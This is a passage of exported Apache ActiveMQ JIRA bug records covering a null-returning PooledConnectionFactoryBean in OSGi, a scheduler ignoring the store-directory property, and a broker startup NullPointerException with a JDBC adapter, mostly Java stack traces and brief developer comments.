	at com.ibm.mq.jmqi.remote.internal.RemoteAsyncConsume.driveConsumer(RemoteAsyncConsume.java:1523)
	at com.ibm.mq.jmqi.remote.internal.RemoteDispatchThread.run(RemoteDispatchThread.java:394)
	at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.runTask(WorkQueueItem.java:209)
	at com.ibm.msg.client.commonservices.workqueue.SimpleWorkQueueItem.runItem(SimpleWorkQueueItem.java:100)
	at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.run(WorkQueueItem.java:224)
	at com.ibm.msg.client.commonservices.workqueue.WorkQueueManager.runWorkQueueItem(WorkQueueManager.java:298)
	at com.ibm.msg.client.commonservices.j2se.workqueue.WorkQueueManagerImplementation$ThreadPoolWorker.run(WorkQueueManagerImplementation.java:1220);;;","04/Jan/11 12:20;gtully;https://issues.apache.org/jira/browse/AMQ-2029 introduced this problem. Not sure what the use case is as the message is being bridged or transformed. Wonder if the destination is really one of the necessary properties that 2029 needs.;;;","04/Jan/11 13:03;gtully;reverted part of fix for https://issues.apache.org/jira/browse/AMQ-2029 as destination name format is provider specific so it is only applicable to the transformed message.
r1055021;;;","04/Jan/11 15:51;pchandler;Thanks for the fix :-) ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PooledConnectionFactoryBean returns null in OSGi env sometimes,AMQ-2960,12483446,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,vbuell,vbuell,05/Oct/10 16:36,07/Jun/14 21:08,14/Jul/23 05:43,03/Nov/13 12:42,,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"From time to time PooledConnectionFactoryBean failed to initialize itself correctly in ServiceMix 4 (FUSE actually). From activemq-broker.xml:

Exception in thread ""SpringOsgiExtenderThread-20"" org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pooledConnectionFactory' defined in URL [bundleentry://110.fwk173823/META-INF/spring/activemq-broker.xml]: factory-bean 'pooledConnectionFactoryFactory' returned null
	at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:289)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:903)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:817)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:440)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
	at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext.access$1600(AbstractDelegatedExecutionApplicationContext.java:69)
	at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext$4.run(AbstractDelegatedExecutionApplicationContext.java:355)
	at org.springframework.osgi.util.internal.PrivilegedUtils.executeWithCustomTCCL(PrivilegedUtils.java:85)
	at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext.completeRefresh(AbstractDelegatedExecutionApplicationContext.java:320)
	at org.springframework.osgi.extender.internal.dependencies.startup.DependencyWaiterApplicationContextExecutor$CompleteRefreshTask.run(DependencyWaiterApplicationContextExecutor.java:132)
	at java.lang.Thread.run(Thread.java:619)


The problem is that Spring sometimes invokes @PreConstruct *AFTER* the getObject() has been used for dependent beans constructing. Therefore PooledConnectionFactoryBean.getObject() returns null.
Lazy initialization is fixing this issue:

    public Object getObject() throws Exception {
        if (pooledConnectionFactory == null)
        {
            afterPropertiesSet();
        }
        return pooledConnectionFactory;
    }
","ServiceMix-4.2.0-fuse-02-00, spring-osgi 1.2.1, spring 2.5.6.SEC02",artnaseef,davsclaus,vbuell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Oct/10 16:39;vbuell;PooledConnectionFactoryBean-lazy-initialization-workaround-for-null.patch;https://issues.apache.org/jira/secure/attachment/12461805/PooledConnectionFactoryBean-lazy-initialization-workaround-for-null.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74759,,,Sat Jun 07 21:08:41 UTC 2014,,,,,,,Patch Available,,,,"0|i0easf:",81510,,,,,,,,,,,,,,,,,,,,,"05/Oct/10 16:39;vbuell;Patch attached;;;","03/Nov/13 12:42;davsclaus;Thanks for the patch.;;;","07/Jun/14 21:08;artnaseef;Git commit: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=4ddbb8546d7ca50b57213da45f3fbd021ef7fe69;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Scheduler not honoring activemq.store.dir property,AMQ-2959,12483461,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dkulp,dkulp,05/Oct/10 14:03,08/Oct/10 15:24,14/Jul/23 05:43,08/Oct/10 15:23,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"I tried updating CXF to use 5.4.1 (from 5.3.1) and the test suite is leaving activemq-data all over the place.   The contents of that dir are:

activemq-data/localhost/scheduler/
db-1.log  scheduleDB.data  scheduleDB.redo

It looks like the scheduler is not honoring the activemq.store.dir system propert that we set to have the activemq data stuck into a directory in target (from maven) that used to work fine for the CXF tests.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2967,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14844,,,Fri Oct 08 15:23:54 UTC 2010,,,,,,,,,,,"0|i0b9zr:",63731,,,,,,,,,,,,,,,,,,,,,"05/Oct/10 14:17;gtully;The property should be: org.apache.activemq.default.directory.prefix
The real difference is that with 5.4.1 the schedular is on by default so a store is created on every broker start. Hence it is now more visible.

Think the real fix is to disable the schedular by default. Ensure the relevant tests have it enabled and update the doc at http://activemq.apache.org/delay-and-schedule-message-delivery.html;;;","08/Oct/10 14:51;gtully;tie these together, another issue makes the change more explicit.;;;","08/Oct/10 15:23;gtully;r1005858;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ broker fails to start due to java.lang.NullPointerException,AMQ-2956,12483844,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,jjanyan,jjanyan,01/Oct/10 17:48,30/Jun/11 14:56,14/Jul/23 05:43,30/Jun/11 14:56,5.3.2,,,,,,,,Broker,,,,1,,,,,,,,,"Broker fails to restart due to a java.lang.NullPointerException. It looks like it has to do with the JDBC persistance adapter. 
I'm using: 

<journaledJDBC journalLogFiles=""5"" dataDirectory=""${activemq.base}/activemq-data"" dataSource=""#mysql-ds""/>
        <bean id=""mysql-ds"" class=""org.apache.commons.dbcp.BasicDataSource"" destroy-method=""close"">
                <property name=""driverClassName"" value=""com.mysql.jdbc.Driver""/>
                <property name=""url"" value=""jdbc:mysql://myhostname.com/activemq?relaxAutoCommit=true""/>
                <property name=""username"" value=""myusername""/>
                <property name=""password"" value=""mypassword""/>
                <property name=""poolPreparedStatements"" value=""true""/>

I can solve this by emptying the table ACTIVEMQ_ACKS. It looks like there are some acks that exist for messages that aren't in the database.

Details below:

Running ActiveMQ Broker...
wrapper  | --> Wrapper Started as Console
wrapper  | Launching a JVM...
jvm 1    | Wrapper (Version 3.2.3) http://wrapper.tanukisoftware.org
jvm 1    |   Copyright 1999-2006 Tanuki Software, Inc.  All Rights Reserved.
jvm 1    | 
jvm 1    | 
jvm 1    | WARNING - Unable to load the Wrapper's native library because none of the
jvm 1    |           following files:
jvm 1    |             libwrapper-linux-x86-64.so
jvm 1    |             libwrapper.so
jvm 1    |           could be located on the following java.library.path:
jvm 1    |             /var/lib/activemq/bin/linux-x86-64/../../bin/linux
jvm 1    |           Please see the documentation for the wrapper.java.library.path
jvm 1    |           configuration property.
jvm 1    |           System signals will not be handled correctly.
jvm 1    | 
jvm 1    | Java Runtime: Sun Microsystems Inc. 1.6.0_21 /usr/java/jdk1.6.0_21/jre
jvm 1    |   Heap sizes: current=117888k  free=111741k  max=466048k
jvm 1    |     JVM args: -Dactivemq.home=../.. -Dactivemq.base=../.. -Djavax.net.ssl.keyStorePassword=password -Djavax.net.ssl.trustStorePassword=password -Djavax.net.ssl.keyStore=../../conf/broker.ks -Djavax.net.ssl.trustStore=../../conf/broker.ts -Dcom.sun.management.jmxremote -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dcom.sun.management.jmxremote.port=1616 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Xmx512m -Djava.library.path=../../bin/linux/ -Dwrapper.key=dafM8UrD_1bFGoNX -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=24752 -Dwrapper.version=3.2.3 -Dwrapper.native_library=wrapper -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=1
jvm 1    | ACTIVEMQ_HOME: ../..
jvm 1    | ACTIVEMQ_BASE: ../..
jvm 1    | Loading message broker from: xbean:activemq.xml
jvm 1    |  INFO | Using Persistence Adapter: JournalPersistenceAdapator(JDBCPersistenceAdapter(org.apache.commons.dbcp.BasicDataSource@4762d950))
jvm 1    |  INFO | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
jvm 1    |  INFO | Database adapter driver override recognized for : [mysql-ab_jdbc_driver] - adapter: class org.apache.activemq.store.jdbc.adapter.MySqlJDBCAdapter
jvm 1    |  INFO | Database lock driver override not found for : [mysql-ab_jdbc_driver].  Will use default implementation.
jvm 1    |  INFO | Attempting to acquire the exclusive lock to become the Master broker
jvm 1    |  INFO | Becoming the master on dataSource: org.apache.commons.dbcp.BasicDataSource@4762d950
jvm 1    |  INFO | ActiveMQ 5.3.2 JMS Message Broker (apollo) is starting
jvm 1    |  INFO | For help or more information please see: http://activemq.apache.org/
jvm 1    | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerException
jvm 1    | java.lang.NullPointerException
jvm 1    | 	at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.getLastMessageBrokerSequenceId(JournalPersistenceAdapter.java:222)
jvm 1    | 	at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
jvm 1    | 	at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
jvm 1    | 	at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:94)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1728)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1688)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:706)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.start(JournalPersistenceAdapter.java:265)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:466)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
jvm 1    | 	at java.security.AccessController.doPrivileged(Native Method)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:619)
jvm 1    |  INFO | ActiveMQ Message Broker (apollo, null) is shutting down
jvm 1    |  INFO | Connector openwire Stopped
jvm 1    |  INFO | Connector stomp Stopped
jvm 1    |  INFO | ActiveMQ JMS Message Broker (apollo, null) stopped
jvm 1    | ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:619)
jvm 1    | Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
jvm 1    | 	at java.security.AccessController.doPrivileged(Native Method)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	... 16 more
jvm 1    | Caused by: java.lang.NullPointerException
jvm 1    | 	at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.getLastMessageBrokerSequenceId(JournalPersistenceAdapter.java:222)
jvm 1    | 	at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
jvm 1    | 	at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
jvm 1    | 	at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:94)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1728)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1688)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:706)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.start(JournalPersistenceAdapter.java:265)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:466)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
jvm 1    | 	... 36 more
jvm 1    | ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:619)
jvm 1    | Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
jvm 1    | 	at java.security.AccessController.doPrivileged(Native Method)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
